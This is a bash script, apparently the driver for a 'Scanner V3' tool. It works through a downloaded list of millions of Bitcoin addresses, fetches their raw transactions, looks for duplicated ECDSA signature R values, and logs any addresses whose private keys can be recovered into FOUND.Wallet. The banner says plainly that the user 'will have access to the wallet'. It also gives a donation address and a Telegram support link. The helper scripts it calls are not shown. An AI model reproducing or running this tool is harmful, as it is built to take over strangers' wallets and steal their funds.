#!/bin/bash
echo "  ______ ____   _____ _    _  _____ ";
echo " |  ____/ __ \ / ____| |  | |/ ____|";
echo " | |__ | |  | | |    | |  | | (___  ";
echo " |  __|| |  | | |    | |  | |\___ \ ";
echo " | |   | |__| | |____| |__| |____) |";
echo " |_|    \____/ \_____|\____/|_____/ ";
echo "                                    ";
echo "                                    ";
echo Scanner V3 Started
echo Donations : bc1q962duatv26hzw080uxu65damn06l
echo  you will have access to the wallet. And if there is no weakness, it will delete that address from the list and check the next address
echo There are more than 42000000 bitcoin addresses that you can download from this link
echo https://gz.blockchair.com/bitcoin/addresses/blockchair_bitcoin_addresses_latest.tsv.gz
echo The program needs to be restarted every 1000 rounds
echo Support : https://t.me/Mohsenkeshavarzian
echo goodluck

for run in {1..1000}; do
    rm addrone.mnk &> /dev/null
    rm rawdata.data &> /dev/null
    rm rawdata2.data &> /dev/null
    rm rawdata3.data &> /dev/null
    rm dup.txt &> /dev/null
    rm R.txt &> /dev/null
    rm S.txt &> /dev/null
    rm mohsen.txt &> /dev/null
    rm fullresult.txt &> /dev/null
    rm Eslah.txt &> /dev/null 
    rm Eslah2.txt &> /dev/null
    rm Eslah3.txt &> /dev/null
#================================================    
    export LINE=1 ; sed -n "${LINE}p" addr.mnk > addrone.mnk
#=====================================================    
    python3 chainaddr.py
    chmod +x get-raw.sh
    sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     sleep 6
     python3 chainaddr2.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     sleep 6
     python3 chainaddr3.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     sleep 6
     python3 chainaddr4.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
      sleep 6 
     python3 chainaddr5.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     sleep 6
     python3 chainaddr6.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     sleep 6
     python3 chainaddr7.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
      sleep 6    
     python3 chainaddr8.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     sleep 6
     python3 chainaddr9.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
      sleep 6
      python3 chainaddr10.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
      sleep 6  


#================================================
    python3 find.py
    grep mohsen  Eslah.txt > Eslah2.txt
    python3 find2.py
    grep -o -P '(?<=focus).*(?=focus)'  Eslah3.txt > rawdata2.data
    rm Eslah.txt &> /dev/null 
    rm Eslah2.txt &> /dev/null
    rm Eslah3.txt &> /dev/null
#====================================================
    chmod +x get-r-s-z.sh
    sed -i -e 's/\r$//' get-r-s-z.sh
    ./get-r-s-z.sh
    sort ./mohsen.txt | uniq  -D >> dup.txt
    grep "R:" dup.txt >> R.txt
    grep "S:" dup.txt >> S.txt
    python3 chaincal.py
    python3 chaincal2.py
    chmod +x calculator.sh
    sed -i -e 's/\r$//' calculator.sh
    ./calculator.sh
    grep "wallet-address:" fullresult.txt >> FOUND.Wallet
    grep "The wallet is not vulnerable" fullresult.txt >> Not-vulnerable.wallet
    chmod +x calculator2.sh
    sed -i -e 's/\r$//' calculator2.sh
    ./calculator2.sh
    sed -i '1d' addr.mnk
 #====================================   
    rm addrone.mnk &> /dev/null
    rm rawdata.data &> /dev/null
    rm rawdata2.data &> /dev/null
    rm rawdata3.data &> /dev/null
    rm dup.txt &> /dev/null
    rm R.txt &> /dev/null
    rm S.txt &> /dev/null
    rm mohsen.txt &> /dev/null
    rm fullresult.txt &> /dev/null
    rm Eslah.txt &> /dev/null 
    rm Eslah2.txt &> /dev/null
    rm Eslah3.txt &> /dev/null

    
    echo ============END number $run - Start NEXT ADDRESS  ===========
done
